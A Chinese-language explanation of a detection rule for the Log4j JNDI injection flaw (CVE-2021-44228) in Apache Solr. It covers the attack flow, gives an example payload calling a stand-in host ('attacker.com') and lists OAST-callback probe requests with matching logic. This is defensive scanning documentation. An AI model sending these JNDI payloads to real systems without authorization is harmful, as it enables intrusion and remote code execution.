# Apache Solr 7+ - Log4j JNDI RCE 漏洞（CVE-2021-44228）探测原理说明

## 1. 漏洞简介

Apache Log4j2 是广泛使用的 Java 日志组件。2021 年披露的 CVE-2021-44228（Log4Shell）漏洞，允许攻击者通过 JNDI 注入远程加载恶意代码，进而实现远程代码执行（RCE）。Apache Solr 7 及以上版本集成了受影响的 Log4j2 版本，因此也受到该漏洞影响。

## 2. 影响范围

- Apache Solr 7 及以上版本，使用 Log4j2 <= 2.14.1
- 只要日志记录、配置或参数中存在用户可控内容，均可能被利用

## 3. 漏洞原理

Log4j2 在处理日志消息时，支持 JNDI（Java Naming and Directory Interface）查找功能。攻击者可以通过构造特殊的日志内容，诱使 Log4j2 访问恶意的 JNDI 服务器（如 LDAP），从而加载并执行远程代码。

在 Solr 中，部分管理接口参数会被记录到日志，攻击者可通过 HTTP 请求注入恶意 JNDI payload。

## 4. 利用方式与攻击流程

1. 攻击者搭建恶意 LDAP 服务器，返回恶意 Java 类。
2. 构造包含 JNDI payload 的 HTTP 请求（如：`$\{jndi:ldap://attacker.com/a\}`），发送到 Solr 管理接口。
3. Solr 日志记录参数时，Log4j2 解析 payload，触发 JNDI 查找，访问攻击者的 LDAP 服务器。
4. 恶意 Java 类被加载并执行，实现远程命令执行。

## 5. 探测原理与流程（yaml 规则详细说明）

该 yaml 探测规则利用了 DNSLog/OAST 平台（如 Interactsh）进行无害化探测，具体流程如下：

### 5.1 探测请求的构造

- 工具会向目标 Solr 实例的管理接口发送如下格式的 HTTP GET 请求：

  ```
  GET /solr/admin/{endpoint}?action=${jndi:ldap://${:-<rand1>}${:-<rand2>}.${hostName}.uri.<interactsh-url>/} HTTP/1.1
  Host: <目标主机>
  ```
  - `{endpoint}` 取值为 `collections` 和 `cores`，分别测试两个接口。
  - `action` 参数中注入了 JNDI payload，payload 中包含随机数（<rand1>、<rand2>）、主机名和 OAST 平台生成的唯一域名（如 Interactsh）。
  - 该 payload 设计为一旦被 Log4j2 解析，将触发对 OAST 域名的 DNS 查询。

- **示例请求**：
  ```
  GET /solr/admin/collections?action=${jndi:ldap://${:-123}${:-456}.targethost.uri.abcde1234.interactsh.com/} HTTP/1.1
  Host: vulnerable.solr.com
  ```

### 5.2 预期响应与交互

- **HTTP响应内容**：
  - 响应体需包含 `org.apache.solr` 字样，确认目标为 Solr 服务。
  - 其他内容通常为接口返回的管理信息。
- **OAST平台交互**：
  - 如果目标存在漏洞，Log4j2 解析 payload 时会向 OAST 域名发起 DNS 查询。
  - OAST 平台（如 Interactsh）会记录下该 DNS 查询，并可回传给检测工具。

### 5.3 多请求与判定逻辑

- 工具会对 `/solr/admin/collections` 和 `/solr/admin/cores` 两个接口分别发送带有不同随机数的 payload。
- 每个请求的 payload 都包含唯一的随机标识，便于后续关联。
- 检测工具会在 OAST 平台上查询是否有对应的 DNS 请求记录。
- 只有当：
  1. HTTP 响应体中包含 `org.apache.solr`，
  2. OAST 平台收到带有对应随机标识的 DNS 查询，
  3. DNS 查询的格式与 payload 匹配，
  才判定目标存在 Log4j JNDI RCE 漏洞。

- **判定流程伪代码**：
  ```pseudo
  for endpoint in [collections, cores]:
      rand1, rand2 = 随机生成
      payload = f'${{jndi:ldap://${{:-{rand1}}}${{:-{rand2}}}.{hostName}.uri.<oast-domain>/}}'
      发送 GET /solr/admin/{endpoint}?action={payload}
      记录 rand1, rand2, endpoint
      
  等待 OAST 平台回调
  for 每条 OAST DNS 记录:
      如果 DNS 查询中包含 rand1, rand2, hostName, endpoint:
          且对应 HTTP 响应体含 org.apache.solr:
              判定目标存在漏洞
  ```

- **关联判定的意义**：
  - 通过唯一的随机标识，将每个 HTTP 请求与 OAST 平台的 DNS 查询一一对应，避免误报。
  - 只有当请求与 DNS 查询都能关联上，且目标确实为 Solr，才判定为漏洞。
  - 这种方式无需真正执行恶意代码，安全且高效。

- **流程图**：
  ```mermaid
  graph TD
      A[发送带payload的GET请求到/solr/admin/collections/cores] --> B{响应体含org.apache.solr?}
      B -- 否 --> F[非Solr目标, 终止]
      B -- 是 --> C[等待OAST平台DNS回显]
      C --> D{DNS查询中含随机标识?}
      D -- 否 --> F
      D -- 是 --> E[判定目标存在Log4j JNDI RCE漏洞]
  ```

通过上述流程，既保证了探测的准确性，也避免了对目标系统的实际危害。

## 6. 参考链接

- [Apache Solr 官方安全公告](https://solr.apache.org/security.html#apache-solr-affected-by-apache-log4j-cve-2021-44228)
- [Log4j 官方安全公告](https://logging.apache.org/log4j/2.x/security.html)
- [CVE-2021-44228 NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Vulhub Log4j 漏洞环境](https://github.com/vulhub/vulhub/tree/master/log4j/CVE-2021-44228)

本规则通过 OAST/DNSLog 探测方式，安全、高效地检测 Apache Solr 是否存在 Log4j JNDI RCE 漏洞，无需实际利用，适合批量自动化安全检测。 